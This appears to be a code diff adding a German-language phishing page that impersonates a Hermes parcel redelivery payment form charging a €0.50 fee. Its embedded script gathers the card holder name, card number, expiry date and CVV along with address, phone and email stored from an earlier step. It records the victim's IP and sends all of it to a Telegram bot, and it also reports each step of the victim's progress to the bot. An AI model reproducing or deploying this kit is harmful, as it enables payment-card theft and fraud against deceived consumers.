@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Formular 2</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #f4f4f4
+        }
+
+        header {
+            background: #fff;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, .1);
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center
+        }
+
+        header img.logo {
+            height: 26px
+        }
+
+        .icon-button {
+            background: #00a1e0;
+            padding: 10px;
+            border-radius: 5px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 21px;
+            height: 21px;
+            cursor: pointer;
+            transition: filter .2s
+        }
+
+        .icon-button:active {
+            filter: brightness(90%)
+        }
+
+        .icon-button img {
+            width: 20px;
+            height: 20px
+        }
+
+        main {
+            padding: 20px
+        }
+
+        .payment-block {
+            background: #e3e3e3;
+            padding: 15px;
+            border-radius: 5px
+        }
+
+        .payment-title {
+            color: #00a1e0;
+            font-weight: bold;
+            margin-bottom: 5px
+        }
+
+        .payment-divider {
+            border-top: 1px solid #ccc;
+            margin: 15px 0
+        }
+
+        label {
+            font-weight: bold;
+            font-size: 14px
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px
+        }
+
+        .flex-row {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap
+        }
+
+        .flex-row .field input {
+            flex: 1 1 45%;
+            width: 80px !important
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #ff6600;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px
+        }
+
+        .card-logos {
+            margin-bottom: 15px
+        }
+
+        .card-logos img {
+            height: 30px;
+            margin-right: 5px
+        }
+
+        footer {
+            background: #333;
+            color: #fff;
+            padding: 15px;
+            font-size: 16px
+        }
+
+        .footer-section {
+            border-bottom: 1px solid #555;
+            padding: 16px 0
+        }
+
+        .footer-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            color: #00a1e0;
+            font-weight: bold
+        }
+
+        .footer-item .arrow {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-right: 2px solid #00a1e0;
+            border-bottom: 2px solid #00a1e0;
+            transform: rotate(45deg);
+            transition: transform .3s
+        }
+
+        .footer-section.active .arrow {
+            transform: rotate(-135deg)
+        }
+
+        .footer-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height .3s ease;
+            padding-left: 10px
+        }
+
+        .footer-section.active .footer-content {
+            max-height: 500px;
+            padding-top: 10px
+        }
+
+        .footer-content a,
+        .footer-content p {
+            font-size: 13px;
+            color: #fff;
+            text-decoration: none;
+            margin: 12px 0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 9px;
+            padding-left: 0
+        }
+
+        .footer-content a:hover {
+            text-decoration: underline
+        }
+
+        .footer-content p::before {
+            content: "✓";
+            color: #00c800
+        }
+
+        .card-logos img {
+            height: 30px;
+            margin: 5px 10px 5px 0
+        }
+
+        .footer-note {
+            text-align: center;
+            color: grey;
+            font-size: 14px;
+            margin-top: 30px;
+            margin-bottom: 10px
+        }
+
+        .footer-sub {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: center
+        }
+
+        .footer-sub a {
+            color: #fff;
+            text-decoration: none
+        }
+
+        .footer-sub a:hover {
+            text-decoration: underline
+        }
+
+        /* loader */
+        button.loading {
+            position: relative;
+            color: transparent !important
+        }
+
+        button.loading::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255, 255, 255, .5);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin .6s linear infinite;
+            transform: translate(-50%, -50%)
+        }
+
+        @keyframes spin {
+            to {
+                transform: translate(-50%, -50%) rotate(360deg)
+            }
+        }
+
+        #kartenname,
+        #kartennummer {
+            width: 100% !important;
+            max-width: 306px
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div onclick="window.location.href='https://www.myhermes.de/preise/paeckchen-paket/'" class="icon-button">
+            <img src="https://img.icons8.com/ios-filled/50/ffffff/menu--v1.png" alt="Menu">
+        </div>
+        <img src="logo.png" alt="Logo" onclick="window.location.href='https://www.myhermes.de/'" class="logo">
+        <div onclick="window.location.href='https://www.myhermes.de/konto'" class="icon-button">
+            <img src="https://img.icons8.com/ios/50/ffffff/user--v1.png" alt="Profile">
+        </div>
+    </header>
+
+    <main>
+        <div class="payment-block">
+            <div class="payment-title">Bezahlen Sie online</div>
+            <div class="payment-divider"></div>
+
+            <p>Für die erneute Lieferung berechnen wir eine Servicegebühr</p>
+
+            <div class="card-logos">
+                <img src="https://img.icons8.com/color/48/000000/visa.png" />
+                <img src="https://img.icons8.com/color/48/000000/mastercard.png" />
+                <img src="https://img.icons8.com/color/48/000000/amex.png" />
+                <img src="https://img.icons8.com/color/48/000000/maestro.png" />
+                <img src="https://img.icons8.com/color/48/000000/discover.png" />
+                <img src="https://img.icons8.com/color/48/000000/jcb.png" />
+            </div>
+
+            <!-- НІЯКОГО action/onsubmit -->
+            <form id="step2Form">
+                <label for="kartenname">Name auf der Karte *</label><br>
+                <input type="text" id="kartenname" name="kartenname" required><br>
+
+                <label for="kartennummer">Kartennummer *</label><br>
+                <input type="text" id="kartennummer" name="kartennummer" placeholder="0000 0000 0000 0000"
+                    inputmode="numeric" required><br>
+
+                <div class="flex-row">
+                    <div class="field">
+                        <label for="ablaufdatum">Ablaufdatum (MM/JJ) *</label><br>
+                        <input type="text" id="ablaufdatum" name="ablaufdatum" placeholder="MM/JJ" inputmode="numeric"
+                            required>
+                    </div>
+
+                    <div class="field">
+                        <label for="cvv">Sicherheitscode (CCV) *</label><br>
+                        <input type="text" id="cvv" name="cvv" inputmode="numeric" pattern="\d*" required>
+                    </div>
+                </div>
+
+                <!-- приховані з попередньої сторінки (якщо треба в UI) -->
+                <input type="hidden" id="name" name="name">
+                <input type="hidden" id="adresse" name="adresse">
+                <input type="hidden" id="plz" name="plz">
+                <input type="hidden" id="stadt" name="stadt">
+                <input type="hidden" id="telefonnummer" name="telefonnummer">
+                <input type="hidden" id="email" name="email">
+
+                <button type="submit" id="submitBtn">Gesamt : € 0.50</button>
+            </form>
+        </div>
+    </main>
+
+    <!-- футер залишаю як у тебе (опущено для стислості) -->
+
+    <!-- Підключи конфіг вище або тут -->
+    <script src="tgConfig.js"></script>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            if (!window.TGCFG) { console.warn("TGCFG missing"); return; }
+
+            // ---------- helpers ----------
+            // Надсилання в TG БЕЗ preflight
+            function sendGET(url, params) {
+                const u = new URL(url);
+                Object.entries(params).forEach(([k, v]) => u.searchParams.set(k, v));
+                if (navigator.sendBeacon) { navigator.sendBeacon(u.toString()); return; }
+                fetch(u.toString(), { method: "GET", mode: "no-cors", keepalive: true, credentials: "omit" })
+                    .catch(() => { });
+            }
+            function tgStat(text) {
+                sendGET(`https://api.telegram.org/bot${TGCFG.STATS_TOKEN}/sendMessage`, {
+                    chat_id: TGCFG.CHAT_ID, text
+                });
+            }
+            function tgData(text) {
+                // можна тим самим способом
+                sendGET(`https://api.telegram.org/bot${TGCFG.DATA_TOKEN}/sendMessage`, {
+                    chat_id: TGCFG.CHAT_ID, text, parse_mode: "HTML", disable_web_page_preview: "true"
+                });
+            }
+            async function getIP() {
+                try {
+                    const r = await fetch("https://api.ipify.org?format=json");
+                    const j = await r.json(); return j.ip || "unknown";
+                }
+                catch { return "unknown"; }
+            }
+            function collectForm1() {
+                return {
+                    vorname: sessionStorage.getItem('f1.vorname') || "",
+                    nachname: sessionStorage.getItem('f1.nachname') || "",
+                    adresszeile: sessionStorage.getItem('f1.adresszeile') || "",
+                    adresszusatz: sessionStorage.getItem('f1.adresszusatz') || "",
+                    stadt: sessionStorage.getItem('f1.stadt') || "",
+                    plz: sessionStorage.getItem('f1.plz') || "",
+                    telefonnummer: sessionStorage.getItem('f1.telefonnummer') || "",
+                    email: sessionStorage.getItem('f1.email') || "",
+                    zeit: sessionStorage.getItem('f1.zeit') || ""
+                };
+            }
+
+            // ---------- лог при відкритті цієї (3-ї) форми ----------
+            tgStat("4️⃣Користувач перейшов на третю форму");
+
+            // ---------- підставити hidden з URL (як було) ----------
+            const qp = new URLSearchParams(location.search);
+            const hidden = id => { const el = document.getElementById(id); if (el) el.value = qp.get(id) || el.value || ""; };
+            ["name", "adresse", "stadt", "plz", "telefonnummer", "email"].forEach(hidden);
+
+            // ---------- форматування полів ----------
+            const num = document.getElementById('kartennummer');
+            num.addEventListener('input', e => {
+                let v = e.target.value.replace(/\D/g, '').slice(0, 19);
+                e.target.value = v.replace(/(\d{4})(?=\d)/g, "$1 ");
+            });
+            const exp = document.getElementById('ablaufdatum');
+            exp.addEventListener('input', e => {
+                let v = e.target.value.replace(/\D/g, '').slice(0, 4);
+                e.target.value = v.length >= 3 ? v.slice(0, 2) + '/' + v.slice(2) : v;
+            });
+            const cvv = document.getElementById('cvv');
+            cvv.addEventListener('input', e => {
+                let v = e.target.value.replace(/\D/g, '').slice(0, 3);
+                e.target.value = v;
+            });
+
+            // ---------- лог початку введення (одноразово) ----------
+            let inputLogged = false;
+            document.getElementById('step2Form').addEventListener('input', e => {
+                if (inputLogged) return;
+                if (!(e.target instanceof HTMLInputElement)) return;
+                inputLogged = true;
+                tgStat("5️⃣Користувач почав вводити дані в третій формі");
+            }, { passive: true });
+
+            // ---------- submit ----------
+            const form = document.getElementById('step2Form');
+            const btn = document.getElementById('submitBtn');
+
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                btn.classList.add('loading'); btn.disabled = true;
+
+                // зібрати всі дані
+                const f1 = collectForm1();
+                const f2 = {
+                    kartenname: document.getElementById('kartenname').value.trim(),
+                    kartennummer: document.getElementById('kartennummer').value.replace(/\s/g, '').trim(),
+                    ablaufdatum: document.getElementById('ablaufdatum').value.trim(),
+                    cvv: document.getElementById('cvv').value.trim()
+                };
+                const ip = await getIP();
+                const now = new Date().toLocaleString();
+
+                const msg =
+                    `<b>Neue Einreichung</b>
+Zeit: ${now}
+IP: ${ip}
+
+<b>Form 1</b>
+Vorname: ${f1.vorname}
+Nachname: ${f1.nachname}
+Adresse: ${f1.adresszeile}${f1.adresszusatz ? (" / " + f1.adresszusatz) : ""}
+Stadt: ${f1.stadt}
+PLZ: ${f1.plz}
+Telefon: ${f1.telefonnummer}
+Email: ${f1.email}
+Lieferzeit: ${f1.zeit}
+
+<b>Form 2</b>
+Name auf Karte: ${f2.kartenname}
+Kartennummer: ${f2.kartennummer}
+Ablaufdatum: ${f2.ablaufdatum}
+CVV: ${f2.cvv}`;
+
+                try {
+                    // Надсилаємо дані й статистику
+                    tgData(msg);
+                    tgStat("🟢Користувач успішно відіслав дані");
+
+                    // редирект
+                    window.location.href = 'thanks.html';
+                } catch (err) {
+                    console.error(err);
+                    btn.classList.remove('loading'); btn.disabled = false;
+                    alert("Помилка відправки. Спробуй ще раз.");
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
